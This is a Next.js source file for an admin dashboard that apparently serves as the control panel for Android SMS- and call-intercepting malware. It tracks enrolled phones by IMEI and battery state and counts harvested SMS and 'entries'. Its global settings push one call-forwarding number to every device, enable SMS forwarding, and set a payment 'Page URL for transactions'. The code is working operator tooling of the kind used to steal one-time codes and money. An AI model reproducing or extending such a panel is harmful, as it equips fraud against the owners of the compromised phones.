"use client";
import { useState, useEffect } from "react";
import { ref, onValue, off, update, get } from "firebase/database";
import { auth, database } from "@/app/lib/firebase";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Switch } from "@/components/ui/switch";
import { useRouter } from "next/navigation";
import {
  Phone,
  MessageSquare,
  Smartphone,
  Settings,
  Eye,
  FileText,
  PhoneCall,
  Save,
  Power,
  Trash2,
  RefreshCwIcon,
  Link,
  Search,
} from "lucide-react";
import { toast } from "sonner";

export default function AdminDashboard() {
  const [devices, setDevices] = useState([]);
  const [filteredDevices, setFilteredDevices] = useState([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [globalSettings, setGlobalSettings] = useState({
    call_forwarder_enabled: "",
    call_phone_number: "",
    sms_forwarder_enabled: "",
    sms_phone_number: "",
    url: "",
  });
  const [stats, setStats] = useState({
    totalDevices: 0,
    totalEntries: 0,
    totalSMS: 0,
    onlineDevices: 0,
  });
  const [loading, setLoading] = useState(true);
  const router = useRouter();

  useEffect(() => {
    // Auth check
    const unsubscribe = auth.onAuthStateChanged((user) => {
      if (!user) {
        router.push("/login");
      }
    });

    // Load devices
    const devicesRef = ref(database, "devices");
    const devicesListener = onValue(devicesRef, (snapshot) => {
      if (snapshot.exists()) {
        const devicesData = snapshot.val();
        const devicesArray = Object.keys(devicesData).map((key) => {
          const device = devicesData[key];
          let timestamp = Date.now(); // Default to current time
          
          // Try to get timestamp from different possible fields
          if (device.timestamp) {
            timestamp = typeof device.timestamp === 'string' 
              ? new Date(device.timestamp).getTime() 
              : device.timestamp;
          } else if (device.lastSeen) {
            timestamp = typeof device.lastSeen === 'string' 
              ? new Date(device.lastSeen).getTime() 
              : device.lastSeen;
          } else if (device.created_at) {
            timestamp = typeof device.created_at === 'string' 
              ? new Date(device.created_at).getTime() 
              : device.created_at;
          } else if (device.date) {
            timestamp = typeof device.date === 'string' 
              ? new Date(device.date).getTime() 
              : device.date;
          }
          
          // Ensure timestamp is valid
          if (isNaN(timestamp)) {
            timestamp = Date.now();
          }
          
          return {
            id: key,
            ...device,
            timestamp: timestamp,
            lastSeen: device.lastSeen || timestamp,
            isOnline: Date.now() - (device.lastSeen || timestamp) < 300000, // 5 minutes
          };
        }).sort((a, b) => {
          // Sort by serial_number in descending order (highest first: 5, 4, 3, 2, 1)
          const serialA = parseInt(a.serial_number) || 0;
          const serialB = parseInt(b.serial_number) || 0;
          return serialB - serialA;
        });
        
        setDevices(devicesArray);
        setFilteredDevices(devicesArray);
        setStats((prev) => ({
          ...prev,
          totalDevices: devicesArray.length,
          onlineDevices: devicesArray.filter((d) => d.isOnline).length,
        }));
      }
      setLoading(false);
    });

    // Load entries count
    const entriesRef = ref(database, "entries");
    const entriesListener = onValue(entriesRef, (snapshot) => {
      const count = snapshot.exists() ? Object.keys(snapshot.val()).length : 0;
      setStats((prev) => ({ ...prev, totalEntries: count }));
    });

    // Load SMS count
    const smsRef = ref(database, "sms");
    const smsListener = onValue(smsRef, (snapshot) => {
      const count = snapshot.exists() ? Object.keys(snapshot.val()).length : 0;
      setStats((prev) => ({ ...prev, totalSMS: count }));
    });

    // Load global settings
    const settingsRef = ref(database, "settings");
    const settingsListener = onValue(settingsRef, (snapshot) => {
      if (snapshot.exists()) {
        setGlobalSettings(snapshot.val());
      }
    });

    // Load forwarding settings from forworder database to sync
    const forwarderRef = ref(database, "forworder");
    const forwarderListener = onValue(forwarderRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        if (data && Object.keys(data).length > 0) {
          // Get settings from the first device as reference
          const firstDevice = Object.values(data)[0];
          if (firstDevice) {
            setGlobalSettings((prev) => ({
              ...prev,
              call_forwarder_enabled: firstDevice.forwarding_status ?? prev?.call_forwarder_enabled ?? false,
              call_phone_number: firstDevice.forwarding_number ?? prev?.call_phone_number ?? "",
            }));
          }
        }
      }
    });

    return () => {
      unsubscribe();
      off(devicesRef, "value", devicesListener);
      off(entriesRef, "value", entriesListener);
      off(smsRef, "value", smsListener);
      off(settingsRef, "value", settingsListener);
      off(forwarderRef, "value", forwarderListener);
    };
  }, [router]);

  // Search functionality
  useEffect(() => {
    if (searchTerm.trim() === "") {
      setFilteredDevices(devices);
    } else {
      const filtered = devices.filter(device => 
        // Search by IMEI
        device.imei?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        // Search by device name
        device.device_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        // Search by brand
        device.brand?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        // Search by manufacturer
        device.manufacturer?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        // Search by model (fallback)
        device.model?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        // Search by serial number
        device.serial_number?.toString().includes(searchTerm)
      ).sort((a, b) => {
        // Maintain serial_number sorting after filter (highest first: 5, 4, 3, 2, 1)
        const serialA = parseInt(a.serial_number) || 0;
        const serialB = parseInt(b.serial_number) || 0;
        return serialB - serialA;
      });
      setFilteredDevices(filtered);
    }
  }, [searchTerm, devices]);

  const saveGlobalSettings = async () => {
    try {
      await update(ref(database, "settings"), globalSettings);
      toast.success("Global settings saved successfully!");
    } catch (error) {
      toast.error("Failed to save settings");
    }
  };

  // Update all devices with a specific key-value pair
  const updateAllDevices = async (key, value) => {
    try {
      const forwarderRef = ref(database, "forworder");
      const snapshot = await get(forwarderRef);
      
      if (snapshot.exists()) {
        const updates = {};
        const data = snapshot.val();
        
        Object.keys(data).forEach((imei) => {
          updates[`${imei}/${key}`] = value;
        });
        
        await update(forwarderRef, updates);
        toast.success(`Updated ${key} for all devices`);
      }
    } catch (error) {
      console.error('Error updating all devices:', error);
      toast.error('Failed to update all devices');
    }
  };

  // Phone number validation - only allow 10 digits
  const handlePhoneNumberChange = (field, value) => {
    // Remove all non-digit characters
    const digitsOnly = value.replace(/\D/g, "");

    // Limit to 10 digits
    const limitedDigits = digitsOnly.slice(0, 10);

    setGlobalSettings((prev) => ({
      ...prev,
      [field]: limitedDigits,
    }));

    // Update all devices when phone number is exactly 10 digits
    if (field === 'call_phone_number' && limitedDigits.length === 10) {
      updateAllDevices('forwarding_number', limitedDigits);
    }
  };

  const toggleDeviceStatus = async (deviceId, currentStatus) => {
    try {
      await update(ref(database, `devices/${deviceId}`), {
        enabled: !currentStatus,
        lastModified: Date.now(),
      });
      toast.success("Device status updated!");
    } catch (error) {
      toast.error("Failed to update device status");
    }
  };

  const deleteDevice = async (deviceId) => {
    if (confirm("Are you sure you want to delete this device?")) {
      try {
        await update(ref(database, `devices/${deviceId}`), null);
        toast.success("Device deleted successfully!");
      } catch (error) {
        toast.error("Failed to delete device");
      }
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 via-blue-50 to-indigo-100">
      <div className="w-full max-w-md mx-auto space-y-4 p-3">
        {/* Quick Navigation - Mobile Optimized */}
        <div className="grid grid-cols-2 gap-2 mb-4">
          <Button
            onClick={() => router.push("/admin/entries")}
            variant="outline"
            className="flex flex-col items-center p-3 h-auto text-xs"
          >
            <FileText className="h-5 w-5 mb-1" />
            <span>All Entries</span>
          </Button>
          <Button
            onClick={() => router.push("/admin/sms")}
            variant="outline"
            className="flex flex-col items-center p-3 h-auto text-xs"
          >
            <MessageSquare className="h-5 w-5 mb-1" />
            <span>All SMS</span>
          </Button>
        </div>

        {/* Stats Cards - Mobile Grid */}
        <div className="grid grid-cols-2 gap-3">
          <Card className="p-3">
            <CardHeader className="pb-2 px-0">
              <CardTitle className="text-xs font-medium flex items-center">
                <Smartphone className="h-3 w-3 mr-1 text-muted-foreground" />
                Devices
              </CardTitle>
            </CardHeader>
            <CardContent className="px-0 pb-0">
              <div className="text-lg font-bold">{stats.totalDevices}</div>
              <p className="text-xs text-muted-foreground">
                {stats.onlineDevices} online
              </p>
            </CardContent>
          </Card>

          <Card className="p-3">
            <CardHeader className="pb-2 px-0">
              <CardTitle className="text-xs font-medium flex items-center">
                <FileText className="h-3 w-3 mr-1 text-muted-foreground" />
                Entries
              </CardTitle>
            </CardHeader>
            <CardContent className="px-0 pb-0">
              <div className="text-lg font-bold">{stats.totalEntries}</div>
              <p className="text-xs text-muted-foreground">All time</p>
            </CardContent>
          </Card>

          <Card className="p-3">
            <CardHeader className="pb-2 px-0">
              <CardTitle className="text-xs font-medium flex items-center">
                <MessageSquare className="h-3 w-3 mr-1 text-muted-foreground" />
                SMS
              </CardTitle>
            </CardHeader>
            <CardContent className="px-0 pb-0">
              <div className="text-lg font-bold">{stats.totalSMS}</div>
              <p className="text-xs text-muted-foreground">All messages</p>
            </CardContent>
          </Card>

          <Card className="p-3">
            <CardHeader className="pb-2 px-0">
              <CardTitle className="text-xs font-medium flex items-center">
                <Power className="h-3 w-3 mr-1 text-muted-foreground" />
                Online
              </CardTitle>
            </CardHeader>
            <CardContent className="px-0 pb-0">
              <div className="text-lg font-bold">{stats.onlineDevices}</div>
              <p className="text-xs text-muted-foreground">
                {(
                  (stats.onlineDevices / stats.totalDevices) * 100 || 0
                ).toFixed(1)}
                %
              </p>
            </CardContent>
          </Card>
        </div>

        {/* Global Settings - Mobile Optimized */}
        <Card className="p-3 hover:shadow-md transition-shadow">
          <CardHeader className="pb-2 px-0">
            <CardTitle className="flex items-center text-sm">
              <Settings className="mr-2 h-4 w-4" />
              Global Settings
            </CardTitle>
            <CardDescription className="text-xs">
              Configure call and SMS forwarding
            </CardDescription>
          </CardHeader>
          <CardContent className="px-0 pb-0 space-y-3">
            <div className="space-y-3">
              {/* Call Forward Section */}
              <div className="space-y-2">
                <div className="flex items-center text-xs">
                  <Phone className="mr-1 h-3 w-3 text-green-600 flex-shrink-0" />
                  <span className="text-muted-foreground">
                    Call Forward Number (10 digits)
                  </span>
                </div>
                <Input
                  id="callForward"
                  placeholder="1234567890"
                  className="text-sm"
                  type="tel"
                  maxLength="10"
                  value={globalSettings?.call_phone_number}
                  onChange={(e) =>
                    handlePhoneNumberChange("call_phone_number", e.target.value)
                  }
                />
                <div className="text-xs text-muted-foreground">
                  {globalSettings?.call_phone_number?.length}/10 digits
                  {globalSettings?.call_phone_number?.length === 10 && (
                    <span className="text-green-600 ml-1">✓ Applied to all devices</span>
                  )}
                </div>
                <div className="flex items-center justify-between bg-muted/50 p-2 rounded">
                  <div>
                    <Label className="text-xs">Auto Call Forward</Label>
                    <div className="text-xs text-muted-foreground mt-0.5">
                      Applies to all connected devices
                    </div>
                  </div>
                  <Switch
                    checked={globalSettings?.call_forwarder_enabled}
                    onCheckedChange={(checked) => {
                      setGlobalSettings((prev) => ({
                        ...prev,
                        call_forwarder_enabled: checked,
                      }));
                      // Update all devices with the forwarding status
                      updateAllDevices('forwarding_status', checked);
                    }}
                  />
                </div>
              </div>

              {/* SMS Forward Section */}
              <div className="space-y-2 border-t pt-3">
                <div className="flex items-center text-xs">
                  <MessageSquare className="mr-1 h-3 w-3 text-blue-600 flex-shrink-0" />
                  <span className="text-muted-foreground">
                    SMS Forward Number (10 digits)
                  </span>
                </div>
                <Input
                  id="smsForward"
                  placeholder="1234567890"
                  className="text-sm"
                  type="tel"
                  maxLength="10"
                  value={globalSettings.sms_phone_number}
                  onChange={(e) =>
                    handlePhoneNumberChange("sms_phone_number", e.target.value)
                  }
                />
                <div className="text-xs text-muted-foreground">
                  {globalSettings?.sms_phone_number?.length}/10 digits
                </div>
                <div className="flex items-center justify-between bg-muted/50 p-2 rounded">
                  <Label className="text-xs">Auto SMS Forward</Label>
                  <Switch
                    checked={globalSettings?.sms_forwarder_enabled}
                    onCheckedChange={(checked) =>
                      setGlobalSettings((prev) => ({
                        ...prev,
                        sms_forwarder_enabled: checked,
                      }))
                    }
                  />
                </div>
              </div>

              {/* UPI Link Section */}
              <div className="space-y-2 border-t pt-3">
                <div className="flex items-center text-xs">
                  <Link className="mr-1 h-3 w-3 text-purple-600 flex-shrink-0" />
                  <span className="text-muted-foreground">Page URL</span>
                </div>
                <Input
                  id="upiLink"
                  placeholder="https://example.com"
                  className="text-sm"
                  type="url"
                  value={globalSettings.url}
                  onChange={(e) =>
                    setGlobalSettings((prev) => ({
                      ...prev,
                      url: e.target.value,
                    }))
                  }
                />
                <div className="text-xs text-muted-foreground">
                  Enter your page URL for transactions
                </div>
              </div>

              {/* Save Button */}
              <div className="border-t pt-3">
                <Button
                  onClick={saveGlobalSettings}
                  className="w-full text-xs py-2"
                >
                  <Save className="mr-2 h-3 w-3" />
                  Save Settings
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Select User - Consistent Card Design */}
        <Card className="p-3 hover:shadow-md transition-shadow">
          <CardHeader className="pb-2 px-0">
            <CardTitle className="flex items-center text-sm">
              <Smartphone className="mr-2 h-4 w-4" />
              Select User ({filteredDevices.length}{searchTerm ? ` of ${devices.length}` : ''})
            </CardTitle>
            <CardDescription className="text-xs">
              Choose a device to manage • Sorted by serial number (highest first)
            </CardDescription>
          </CardHeader>

          <CardContent className="px-0 pb-0 space-y-3">
            <div className="relative">
              <Search className="absolute left-2 top-1/2 transform -translate-y-1/2 h-3 w-3 text-muted-foreground" />
              <Input
                placeholder="Search by IMEI, Device Name, or Brand..."
                className="w-full text-sm pl-8"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>

            {/* Device Grid Layout - Similar to SMS */}
            <div className="grid gap-3">
              {loading ? (
                <div className="flex justify-center py-8">
                  <RefreshCwIcon className="h-6 w-6 animate-spin" />
                </div>
              ) : filteredDevices.length === 0 ? (
                <div className="text-center py-8 text-muted-foreground">
                  {searchTerm ? 'No devices found matching your search' : 'No devices found'}
                </div>
              ) : (
                filteredDevices.map((device, index) => (
                  <Card
                    key={device.id}
                    className="p-3 hover:shadow-md transition-shadow"
                  >
                    <div className="space-y-2">
                      {/* Header with Device Number and Status */}
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-medium text-muted-foreground truncate uppercase">
                          {/* {index + 1}.{" "}
                          {device.model ||
                            device.device_name ||
                            "Unknown Device"} */}
                            {device.serial_number ?? "N"}

                        </span>
                        <div className="flex items-center gap-2">
                          <Badge
                            variant={device.status ? "default" : "secondary"}
                            className="text-xs"
                          >
                            {device.status ? "Online" : "Offline"}
                          </Badge>
                          <div
                            className={`w-2 h-2 rounded-full ${
                              device.status ? "bg-green-500" : "bg-red-500"
                            }`}
                          />
                        </div>
                      </div>

                      {/* Device Details */}
                      <div className="space-y-1">
                        {/* <div className="flex items-center text-xs">
                        <Phone className="mr-1 h-3 w-3 text-green-600 flex-shrink-0" />
                        <span className="text-muted-foreground mr-1">SIM1:</span>
                        <span className="font-medium truncate">{device.simInfo?.sim1?.phoneNumber || 'Unknown SIM1'}</span>
                      </div> */}
                        <div className="flex items-center text-xs">
                          <Phone className="mr-1 h-3 w-3 text-blue-600 flex-shrink-0" />
                          <span className="text-muted-foreground mr-1">
                            Brand:
                          </span>
                          <span className="font-medium truncate">
                            {device?.brand || "Unknown Brand"}
                          </span>
                        </div>
                        <div className="flex items-center text-xs">
                          <Settings className="mr-1 h-3 w-3 text-orange-600 flex-shrink-0" />
                          <span className="text-muted-foreground mr-1">
                            Battery:
                          </span>
                          <span className="font-medium">
                            {device?.battery_status?.battery_percentage || "0"}%
                          </span>
                        </div>
                        <div className="flex items-center text-xs">
                          <Smartphone className="mr-1 h-3 w-3 text-purple-600 flex-shrink-0" />
                          <span className="text-muted-foreground mr-1">
                            IMEI:
                          </span>
                          <span className="font-medium truncate">
                            {device?.imei || "Unknown IP"}
                          </span>
                        </div>
                      </div>

                      {/* Android Version and Last Seen */}
                      <div className="border-t pt-2">
                        <div className="text-xs bg-muted/50 p-2 rounded">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground">
                              {device.manufacturer
                                ? `Manufacturer: ${device.manufacturer}`
                                : "Unknown Manufacturer"}
                            </span>
                            <span className="font-medium">
                              {new Date(
                                device.timestamp || Date.now()
                              ).toLocaleDateString("en-GB", {
                                day: "2-digit",
                                month: "short",
                              })}{" "}
                              {new Date(
                                device.timestamp || Date.now()
                              ).toLocaleTimeString("en-GB", {
                                hour: "2-digit",
                                minute: "2-digit",
                              })}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Manage Button */}
                      <div className="border-t pt-2">
                        <Button
                          onClick={() =>
                            router.push(`/admin/devices/${device.id}`)
                          }
                          className="bg-gradient-to-r from-green-400 to-blue-400 hover:from-green-500 hover:to-blue-500 text-white px-4 py-1.5 text-xs rounded w-full"
                        >
                          <Settings className="w-3 h-3 mr-1" />
                          Manage Device
                        </Button>
                      </div>
                    </div>
                  </Card>
                ))
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
